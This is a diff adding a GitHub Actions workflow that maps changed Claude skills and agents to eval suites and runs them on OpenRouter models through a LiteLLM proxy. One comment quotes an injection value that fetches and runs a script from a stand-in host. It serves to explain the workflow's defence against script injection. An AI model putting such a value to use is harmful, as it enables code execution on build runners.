@@ -1,0 +1,227 @@
+# Harness evals — routes each PR to the eval suites that actually cover what it touched.
+#
+#   a skill under .claude/skills/<name>/**  → run evals/skills/<name>  (content tier, matrix)
+#   an agent under .claude/agents/<name>.md → run evals/agents/<name>  (tool tier, matrix)
+#   CLAUDE.md, an agent, evals/workflow/**, → run the workflow tier (systemic: does the on-disk
+#   or the engine (evals/src/**)              harness — CLAUDE.md + skills + subagents — actually
+#                                              behave as documented)
+#
+# The mapping lives in evals/scripts/ci-detect.mjs (already written, never wired to CI before this
+# file) — this workflow's only job is to call it and fan its outputs out into jobs. An artifact
+# with no written evals is not a failure: ci-detect logs it as SKIP, and this workflow does not
+# invent a check for something nobody wrote a test for.
+#
+# Model: every eval here runs on OpenRouter (EVAL_BACKEND=openrouter), not the Claude Code
+# subscription — CI has no subscription session to piggyback on, and OpenRouter's per-token
+# pricing keeps a PR's eval bill predictable. deepseek/deepseek-chat is the model UNDER TEST
+# (EVAL_MODEL); the judge (EVAL_JUDGE_MODEL) is deliberately a different family
+# (google/gemini-2.5-flash) — see evals/src/scoring/llm-judge.ts's own comment on why a same-family
+# judge softens self-preference. Both are set here, not surfaced as workflow_dispatch inputs, so
+# there's nothing to configure in the Actions UI — change the model by editing this file.
+#
+# The tool tier (agents, workflow) drives the Claude Agent SDK, which only speaks the Anthropic
+# wire protocol — so those two jobs front OpenRouter with the LiteLLM translating proxy this repo
+# already ships at evals/proxy/ (see its docker-compose.yml / litellm.config.yaml for why). The
+# skill tier talks to OpenRouter directly (no SDK involved) and skips the proxy entirely.
+#
+# Needs an OPENROUTER_API_KEY repository secret — add it under Settings → Secrets → Actions. Not
+# something this workflow can provision for you.
+name: evals
+
+on:
+  push:
+    branches: [main]
+  pull_request:
+
+permissions:
+  contents: read
+
+concurrency:
+  group: evals-${{ github.ref }}
+  cancel-in-progress: true
+
+# Content-tier and tool-tier model choice — see the header comment for why they differ.
+env:
+  EVAL_BACKEND: openrouter
+  EVAL_MODEL: deepseek/deepseek-chat
+  EVAL_JUDGE_MODEL: google/gemini-2.5-flash
+
+jobs:
+  # --- what changed, and which suites cover it -----------------------------------------------
+  detect:
+    name: detect changed skills/agents
+    runs-on: ubuntu-latest
+    outputs:
+      skills: ${{ steps.detect.outputs.skills }}
+      agents: ${{ steps.detect.outputs.agents }}
+      run_workflow: ${{ steps.detect.outputs.run_workflow }}
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 0 # need base..HEAD history to diff; a shallow clone can't
+
+      - name: List changed files
+        id: changed
+        shell: bash
+        run: |
+          if [ "${{ github.event_name }}" = "pull_request" ]; then
+            git fetch origin "${{ github.base_ref }}" --depth=1
+            files="$(git diff --name-only "origin/${{ github.base_ref }}...HEAD")"
+          else
+            # push to main: diff against the previous tip. A brand-new branch/first push has an
+            # all-zero "before" SHA — fall back to the single commit that triggered this run.
+            before="${{ github.event.before }}"
+            if [ -z "$before" ] || [ "$before" = "0000000000000000000000000000000000000000" ]; then
+              files="$(git diff --name-only HEAD~1 HEAD 2>/dev/null || git show --name-only --pretty='' HEAD)"
+            else
+              files="$(git diff --name-only "$before" "${{ github.sha }}")"
+            fi
+          fi
+          # A random delimiter, not a fixed "EOF" — a changed file whose path is literally the
+          # line "EOF" (a PR can add one) would otherwise close the heredoc early and let the
+          # rest of the file list be parsed as extra $GITHUB_OUTPUT keys.
+          delim="EOF_${RANDOM}${RANDOM}"
+          echo "files<<$delim" >> "$GITHUB_OUTPUT"
+          echo "$files" >> "$GITHUB_OUTPUT"
+          echo "$delim" >> "$GITHUB_OUTPUT"
+
+      - uses: pnpm/action-setup@v4
+        with:
+          version: 10
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+
+      - name: Map changed files to eval suites
+        id: detect
+        working-directory: evals
+        env:
+          CHANGED_FILES: ${{ steps.changed.outputs.files }}
+        run: node scripts/ci-detect.mjs
+
+  # --- content tier: one job per changed skill, in parallel -----------------------------------
+  skills:
+    name: skill ${{ matrix.skill }}
+    needs: detect
+    if: needs.detect.outputs.skills != '[]'
+    strategy:
+      fail-fast: false
+      matrix:
+        skill: ${{ fromJSON(needs.detect.outputs.skills) }}
+    runs-on: ubuntu-latest
+    defaults:
+      run:
+        working-directory: evals
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: pnpm/action-setup@v4
+        with:
+          version: 10
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+          cache: pnpm
+          cache-dependency-path: evals/pnpm-lock.yaml
+
+      - run: pnpm install --frozen-lockfile
+
+      # Content tier only — no Agent SDK, no proxy. runContent() goes straight to OpenRouter.
+      #
+      # matrix.skill comes from a directory name under .claude/skills/**, which a PR author
+      # fully controls — interpolating it directly into `run:` via ${{ }} would let a crafted
+      # skill directory name (e.g. containing `"; curl evil.sh | sh #`) execute on the runner,
+      # since GitHub expands the template BEFORE bash sees the line. Pass it through env instead,
+      # so it reaches the shell as a plain variable value, never as script text.
+      - run: npx vitest run "skills/$SKILL_NAME"
+        env:
+          SKILL_NAME: ${{ matrix.skill }}
+          OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
+
+  # --- tool tier: one job per changed agent, in parallel ---------------------------------------
+  agents:
+    name: agent ${{ matrix.agent }}
+    needs: detect
+    if: needs.detect.outputs.agents != '[]'
+    strategy:
+      fail-fast: false
+      matrix:
+        agent: ${{ fromJSON(needs.detect.outputs.agents) }}
+    runs-on: ubuntu-latest
+    defaults:
+      run:
+        working-directory: evals
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: pnpm/action-setup@v4
+        with:
+          version: 10
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+          cache: pnpm
+          cache-dependency-path: evals/pnpm-lock.yaml
+
+      - run: pnpm install --frozen-lockfile
+
+      - name: Start LiteLLM translating proxy
+        env:
+          OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
+        run: scripts/litellm-proxy.sh up
+
+      # Agent SDK tier — goes through the proxy so it can speak Anthropic-wire to a non-Anthropic
+      # model. OPENROUTER_BASE_URL here is the proxy, not openrouter.ai directly.
+      #
+      # matrix.agent, same as matrix.skill above: a PR-controlled directory name, passed through
+      # env rather than interpolated into the run: line, so it can't be read as script text.
+      - run: npx vitest run "agents/$AGENT_NAME"
+        env:
+          AGENT_NAME: ${{ matrix.agent }}
+          OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
+          OPENROUTER_BASE_URL: http://localhost:4000
+
+      - name: Stop LiteLLM proxy
+        if: always()
+        run: scripts/litellm-proxy.sh down
+
+  # --- workflow tier: systemic check when CLAUDE.md / an agent / the engine changes -------------
+  workflow:
+    name: workflow tier
+    needs: detect
+    if: needs.detect.outputs.run_workflow == 'true'
+    runs-on: ubuntu-latest
+    defaults:
+      run:
+        working-directory: evals
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: pnpm/action-setup@v4
+        with:
+          version: 10
+
+      - uses: actions/setup-node@v4
+        with:
+          node-version: 22
+          cache: pnpm
+          cache-dependency-path: evals/pnpm-lock.yaml
+
+      - run: pnpm install --frozen-lockfile
+
+      - name: Start LiteLLM translating proxy
+        env:
+          OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
+        run: scripts/litellm-proxy.sh up
+
+      - run: pnpm eval:workflow
+        env:
+          OPENROUTER_API_KEY: ${{ secrets.OPENROUTER_API_KEY }}
+          OPENROUTER_BASE_URL: http://localhost:4000
+
+      - name: Stop LiteLLM proxy
+        if: always()
+        run: scripts/litellm-proxy.sh down
